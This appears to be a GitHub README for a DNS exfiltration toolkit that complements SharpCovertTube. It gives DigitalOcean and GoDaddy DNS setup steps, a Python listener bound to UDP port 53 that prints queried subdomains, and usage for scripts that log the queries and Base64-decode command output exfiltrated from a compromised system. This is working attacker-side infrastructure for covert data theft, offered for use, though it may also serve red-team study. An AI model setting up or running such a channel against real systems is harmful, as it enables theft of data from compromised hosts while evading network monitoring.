# DNS Exfiltration
Notes and custom scripts for DNS exfiltration using DigitalOcean and GoDaddy. This project is a complement for SharpCovertTube, it covers how to receive and decode the DNS exfiltrated data.

-------------------------------------------

### DigitalOcean

Create a project, connect the GoDaddy's domain to it and create a droplet.

Then, add the following DNS records:

- "A" record for your domain, for example "domain.com", pointing to the droplet's IP address.
- "A" record for subdomain "ns" pointing to the droplet's IP address.
- "NS" record for a subdomain, for example "steve", pointing to the droplet's IP address.
   - NOTE: This is the subdomain we will use for DNS exfiltration.
- "NS" record redirecting to ns1.digitalocean.com (if not already in there).
- "NS" record redirecting to ns2.digitalocean.com (if not already in there).
- "NS" record redirecting to ns3.digitalocean.com (if not already in there).

-------------------------------------------

### GoDaddy

After purchasing a domain in GoDaddy, visit the "DNS Management" section ([https://dcc.godaddy.com/manage/YOUR_DOMAIN/dns](https://dcc.godaddy.com/manage/YOUR_DOMAIN/dns)). You have to add an entry in the "Hostname" subsection, which will contain the host "ns" and will point to your DigitalOcean droplet's IP address:

Then, in "Nameservers" subsection, add the DigitalOcean nameservers if they are not already in there (ns1.digitalocean.com, ns2.digitalocean.com and ns3.digitalocean.com):

### Testing DNS exfiltration

We can now run a Python script to start monitoring DNS queries to the subdomains "*.steve.domain.com": 

```python
import socket
from dnslib import DNSRecord

ns_subdomain = ".steve"

server = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
server.bind(('0.0.0.0', 53))

while True:
  data, addr = server.recvfrom (4096)
  d = DNSRecord.parse(data)
  subdomain = str(d.questions[0]._qname).split(ns_subdomain)[0]
  print("Subdomain: " + subdomain)
```

It must be run as superuser and the port 53 is probably already in use so first we can stop any process using that port with:

```
fuser -k 53/udp
```

For example, if your domain is "domain.com" and the record added to DigitalOcean is "steve", we could run a DNS query (from any system) to the subdomain "test.steve.domain.com". If everything is correct, we should see an output similar to this: 

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/dns-exfiltration/Screenshot_5.png)

However even with a simple "nslookup test.steve.domain.com" command we will find that there are too many queries and they get repeated, so we will use custom scripts to monitor these DNS queries.

-------------------------------------------

### Custom Scripts

If everything works fine, we can run the custom script dns.py where you can set the subdomain to monitor with the parameter -s and a file to store the program output with the parameter -l:

```
python3 dns.py [-s SUBDOMAIN] [-l LOGFILE]
```

Then, the output can be decoded using the custom script decode.py, where you can set a filter with a list of comma-separated minutes from the log file with the parameter -f and the log file to read from with the parameter -l. The implemented decoding function decodes Base64 but you can change it depending on how you encode the exfiltrated data:

```
python3 decode.py -f FILTER_MINUTES -l LOGFILE
```

As an example, I run the [SharpCovertTube](https://github.com/ricardojoserf/SharpCovertTube) program which exfiltrates the command output from the compromised system via DNS, generating several queries:

These queries are received by dns.py, which is monitoring the subdomains "*.steve.domain.com", and get stored in the file log.txt:

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/dns-exfiltration/Screenshot_7.png)

Then we can Base64-decode the DNS queries received in the minute 11:08 and stored in log.txt:
